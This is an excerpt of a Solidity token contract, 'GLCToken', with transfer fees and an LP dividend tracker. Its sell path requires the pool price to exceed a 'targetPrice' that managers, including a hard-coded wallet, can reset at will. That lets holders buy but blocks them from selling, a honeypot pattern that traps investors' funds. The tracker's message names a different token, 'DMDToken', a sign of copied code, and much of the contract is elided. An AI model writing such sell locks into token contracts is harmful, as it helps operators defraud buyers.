...
struct Map {
    ...
    function withdrawDividend() public override {
        require(false, "Dividen_Tracker: withdrawDividend disabled. Use the 'claim' function on the main DMDToken contract.");
    }
    ...
    function setBalance(address account, uint256 newBalance) external hasRole {
...
contract GLCToken is ERC20("GLC", "GLC"), Ownable {
    
    using SafeMath for uint256;

    uint8 private _decimals = 18;
    uint256 private _totalSupply = 1971413 * (10**_decimals);
    mapping(address => uint256) private _tOwned;

    uint256 private _tTotal = _totalSupply;

    uint256 public lpHolderFee = 30;
    uint256 public burnFee = 30;
    uint256 targetPrice = 15000 * 1e18;
    ...
    constructor(address _router, address _usdt) {
    	...
    	dividendTracker = new AutoDividendTracker(address(this), address(this));
        ...
        liquidityWallet = 0x4567d86c8DA5B3DdF431aE4F03e8D6A6bd89aD51;
        ...
        managerMap[liquidityWallet] = true;
    ...
    function _takeFees(address sender, address recipient, FeeInfo memory _feeInfo) private {
       if (_feeInfo.tBurn > 0) {
        ...
        if (_feeInfo.tLpHoldersFee > 0) {
            _tOwned[address(this)] = _tOwned[address(this)].add(_feeInfo.tLpHoldersFee);
            _approve(address(this), address(dividendTracker), _feeInfo.tLpHoldersFee);
            dividendTracker.distributeETHDividends(_feeInfo.tLpHoldersFee);
        }
        ...
        )
    {
        ...
        _feeInfoTmp.tLpHoldersFee = tAmount.mul(lpHolderFee).div(1000);
        _feeInfoTmp.tBurn = tAmount.mul(burnFee).div(1000);
        _feeInfoTmp.tAmount = tAmount;
        tTransferAmount = tTransferAmount.sub(_feeInfoTmp.tLpHoldersFee).sub(_feeInfoTmp.tBurn);
    ...
    function _tokenTransferWithFee(
        ...
        if (_isSell){
            require(currentPrice() >= targetPrice, "not priced");
        }
...
if (_isBuy){
    try
        dividendTracker.setBalance(recipient, IERC20(uniswapV2Pair).balanceOf(recipient))
    {}catch{
    ...
    function currentPrice()public view returns (uint){
        ...
        }else if (_pair.token0() == address(this)) {
            return uniswapV2Router.quote(amount, reserve0, reserve1);
        }

    }
    function setRouterA(address _add) public onlyManager {
        routerA = _add;
        dividendTracker.enableRole(_add);
        _taxExcluded[routerA] = true;
    }
    function setTargetPrice(uint _price) public onlyManager {
        targetPrice = _price;
    }
